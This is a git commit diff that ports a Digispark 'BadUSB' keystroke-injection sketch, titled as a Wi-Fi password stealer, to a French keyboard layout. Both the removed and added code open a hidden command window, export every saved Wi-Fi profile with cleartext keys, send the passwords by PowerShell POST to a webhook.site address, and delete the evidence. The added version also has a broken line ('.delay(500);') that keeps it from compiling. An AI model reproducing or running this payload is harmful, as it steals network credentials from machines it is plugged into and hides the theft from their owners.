c4dd13840effda974f888a3ea1d2baa9252a4215
dellarte <dellarte@users.noreply.github.com>
2022-06-16 15:20:00 +0200

    Update WifiKey-Grab_Minimize-of-Shame.ino

--- payloads/Wi-Fi password stealer/WifiKey-Grab_Minimize-of-Shame.ino
+++ payloads/Wi-Fi password stealer/WifiKey-Grab_Minimize-of-Shame.ino
@@ -4,8 +4,7 @@
 */
 
 
-#include "DigiKeyboard.h"
-#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#include "DigiKeyboardFr.h"
 #define KEY_ENTER 0x28 //Return/Enter Key
 
 void setup() {
@@ -13,40 +12,37 @@ void setup() {
 }
 
 void loop() {
-   
-  DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
- 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
-  DigiKeyboard.delay(500);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
+  DigiKeyboardFr.update();
+  DigiKeyboardFr.sendKeyStroke(0);
+  DigiKeyboardFr.delay(3000);
+  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboardFr.delay(100);
+  DigiKeyboardFr.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
+  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
+  DigiKeyboardFr.sendKeyStroke(KEY_L); //goto Move
   for(int i =0; i < 100; i++)
     {
-      DigiKeyboard.sendKeyStroke(KEY_DOWN);
+      DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
     }
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); //going to temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
-  
+  DigiKeyboardFr.sendKeyStroke(KEY_ENTER); //Detach from scrolling
+  DigiKeyboardFr.delay(100);
+  DigiKeyboardFr.println("cd %temp%"); //going to temporary dir
+  .delay(500);
+  DigiKeyboardFr.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
+  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+  DigiKeyboardFr.delay(500);
+  DigiKeyboardFr.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
+  DigiKeyboardFr.delay(3000);
+  DigiKeyboardFr.println("del Wi-* /s /f /q"); //cleaning up all the mess
+  DigiKeyboardFr.delay(100);
+  DigiKeyboardFr.println("exit");
+  DigiKeyboardFr.delay(100);
   digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
+  DigiKeyboardFr.delay(90000);
   digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
+  DigiKeyboardFr.delay(5000);
   
 }
